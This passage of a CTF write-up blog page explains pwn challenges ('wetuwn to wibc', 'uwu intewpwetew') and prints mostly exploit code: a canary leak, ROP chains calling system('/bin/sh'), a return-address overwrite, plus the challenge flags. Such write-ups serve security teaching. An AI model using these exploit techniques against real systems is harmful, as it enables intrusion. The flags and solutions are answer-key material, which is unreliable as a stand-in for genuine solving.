+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">stack = flat(&#123;</span><br><span class="line">    0x70+8: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        exe.sym[&quot;A&quot;],</span><br><span class="line">        exe.sym[&quot;B&quot;],</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0xdeadbeef,</span><br><span class="line">        exe.sym[&quot;C&quot;],</span><br><span class="line">        exe.sym[&quot;win&quot;],</span><br><span class="line">    ],</span><br><span class="line">&#125;,filler=b&#x27;\x00&#x27;,length=0x100)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;uwu owo rawrxd&quot;, stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="wetuwn-to-wibc"><a href="#wetuwn-to-wibc" class="headerlink" title="wetuwn to wibc"></a>wetuwn to wibc</h2><p>this is a very classic <strong>ret-2-libc</strong> question. If you want to see more about ret2libc, check out this <a href="/2021/10/09/ductf2021-pwn-oversight/">oversight</a> challenge</p>
+<p>first, lets check mitigations. We can see all the protection has enabled. including canary. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    Canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>lets take look at the <a href="./uploads/wetuwn-to-wibc.c">source code</a>.</p>
+<p>There is a very trivial bug here, is it didn&#39;t check for the upper bound. So, we can leak canary here. </p>
+<p>Moreover, after getting the canary value, we can just use <code>gets</code> to overwrite the whole stack.</p>
+<p>Since we take control of the whole stack, we just write the canary using the canary value we get from previous step</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (input &gt;= 0 &amp;&amp; input &lt; sizeof uwus) &#123;</span><br><span class="line">    printf(&quot;This UwU&#x27;er has UwU&#x27;ed %llu times!\n&quot;, uwus[input]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    puts(&quot;Error: index out of bounds.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gets(comment);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>part of exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Index: &quot;, b&quot;47&quot;)</span><br><span class="line">io.recvuntil(b&quot;This UwU&#x27;er has UwU&#x27;ed &quot;)</span><br><span class="line">libc.address = int(io.recvuntil(b&quot; times!\n&quot;, drop=True)) - libc.libc_start_main_return</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Index: &quot;, b&quot;43&quot;)</span><br><span class="line">io.recvuntil(b&quot;This UwU&#x27;er has UwU&#x27;ed &quot;)</span><br><span class="line">canary = int(io.recvuntil(b&quot; times!\n&quot;, drop=True))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Index: &quot;, b&quot;-1&quot;)</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    0x108: canary,</span><br><span class="line">    0x110 + 0x8: [</span><br><span class="line">        rop.find_gadget([&quot;ret&quot;])[0],</span><br><span class="line">        rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0],</span><br><span class="line">        next(libc.search(b&quot;/bin/sh\x00&quot;)),</span><br><span class="line">        libc.sym[&#x27;system&#x27;],</span><br><span class="line">        ],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Thanks for using my UwU Counter! What did you think?\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{f1y_m3_t0_th3_m00n_4nd_l3t_m3_pl4y_am0ngu5}</p>
+<h2 id="uwu-intewpwetew"><a href="#uwu-intewpwetew" class="headerlink" title="uwu intewpwetew"></a>uwu intewpwetew</h2><p>a very fun problem. it implement a buggy interpreter of uwu language - <a target="_blank" rel="noopener" href="https://esolangs.org/wiki/UwU">uwu</a></p>
+<p><a href="./uploads/uwu-intewpwetew.c">uwu-intewpwetew.c</a></p>
+<p>all the mitigation protection has open as expected</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Full RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>lets take look at some bugs, firstly, it check the upper bound, but not lower bound. We can see here the pointer is never gonna large than <code>DATA_LEN</code> if it is negative. </p>
+<p>This allow us to read the value above the stack variable</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;o&#x27;:</span><br><span class="line">    pointer--;</span><br><span class="line">    if (pointer &gt; DATA_LEN) &#123;</span><br><span class="line">        printf(&quot;Error: out of bounds\n&quot;);</span><br><span class="line">        print_remaining_and_exit(input, i);</span><br><span class="line">    &#125;</span><br><span class="line">break;</span><br></pre></td></tr></table></figure>
+
+<p>The second bug is it didn&#39;t check for out of bound when read and write value.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;@&#x27;:</span><br><span class="line">    printf(&quot;\npointer: %d\ndata: %d\n&quot;, pointer, data[pointer]);</span><br><span class="line">    break;</span><br><span class="line">case &#x27;&gt;&#x27;:</span><br><span class="line">    printf(&quot;\nInput: &quot;);</span><br><span class="line">    scanf(&quot; %d&quot;, &amp;data[pointer]);</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure>
+
+<p>So, lets combine those two bug. first, lets move the variable pointer to pointer&#39;s address (where pointer is on the stack) . </p>
+<p>Then, use write pointer&#39;s value to RIP offset,</p>
+<p>finally. read RIP address and write RIP address to function win. After execution finish, the binary will jump to <code>win</code> and print out the flag</p>
+<p>part of my exploit.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">class uwu():</span><br><span class="line">    right = &quot;OwO&quot;</span><br><span class="line">    left = &quot;owo&quot;</span><br><span class="line">    read = &quot;@w@&quot;</span><br><span class="line">    write = &quot;&gt;w&lt;&quot;</span><br><span class="line">    plus = &quot;UwU&quot;</span><br><span class="line">    minus = &quot;QwQ&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.instructions = []</span><br><span class="line"></span><br><span class="line">    def add(self,*args):</span><br><span class="line">        self.instructions.extend(args)</span><br><span class="line">    </span><br><span class="line">    def add_list(self,args):</span><br><span class="line">        self.instructions.extend(args)</span><br><span class="line">    </span><br><span class="line">    def output(self):</span><br><span class="line">        return &quot; &quot;.join(self.instructions)</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">log_print(&quot;main addr&quot;, hex(main_addr))</span><br><span class="line">vuln_addr = exe.sym[&quot;vuln&quot;]</span><br><span class="line">log_print(&quot;vuln addr&quot;, hex(vuln_addr))</span><br><span class="line">win_addr = exe.sym[&quot;win&quot;]</span><br><span class="line">log_print(&quot;win addr&quot;, hex(win_addr))</span><br><span class="line"></span><br><span class="line">log_print(hex(vuln_addr-win_addr))</span><br><span class="line"># payload = uwu()</span><br><span class="line"># payload.add(uwu.right,uwu.plus,uwu.right,uwu.plus,uwu.right,uwu.plus,)</span><br><span class="line"># print(payload.output())</span><br><span class="line"></span><br><span class="line">payload = uwu()</span><br><span class="line"># 4 byte padding</span><br><span class="line">payload.add_list([uwu.left]*((0x424-0x410)//4 -1))</span><br><span class="line">payload.add(uwu.read)</span><br><span class="line">payload.add(uwu.write)</span><br><span class="line">log_print(&quot;rip padd offset&quot;, (0x410+0x8)//4)</span><br><span class="line">payload.add(uwu.read)</span><br><span class="line">payload.add(uwu.write)</span><br><span class="line">log_print(payload.output())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(b&quot;Send me your cowode:\n&quot;,payload.output().encode())</span><br><span class="line">io.sendlineafter(b&quot;Input: &quot;,str((0x410+0x8)//4).encode())</span><br><span class="line">io.recvuntil(b&quot;data: &quot;)</span><br><span class="line">main_rip_address = int(io.recvuntil(b&quot;\n&quot;)[:-1:])</span><br><span class="line">log_print(&quot;main rip address&quot;,main_rip_address,hex(main_rip_address &amp; 0xffffffff))</span><br><span class="line">win_real_addr = (main_rip_address &amp; 0xfffff000) | (win_addr &amp; 0xfff)</span><br><span class="line">log_print(&quot;win_real_addr&quot;,win_real_addr,hex(win_real_addr))</span><br><span class="line">io.sendlineafter(b&quot;Input: &quot;,str(win_real_addr).encode())</span><br><span class="line"></span><br><span class="line">log_print(&quot;flag&quot;,io.recv())</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{nyo_wespect_fow_boundawies}</p>
+
+      </div>
+      
+      
+      
+    </div>
+  <ul class="breadcrumb">
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2022/">2022</a></li>
+            <li><a href="/ctf-writeup/2022/saplingctf/">SAPLINGCTF</a></li>
+            <li>SAPLING-CTF-2022-WRITE-UP</li>
+  </ul>
+
+    
+    
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
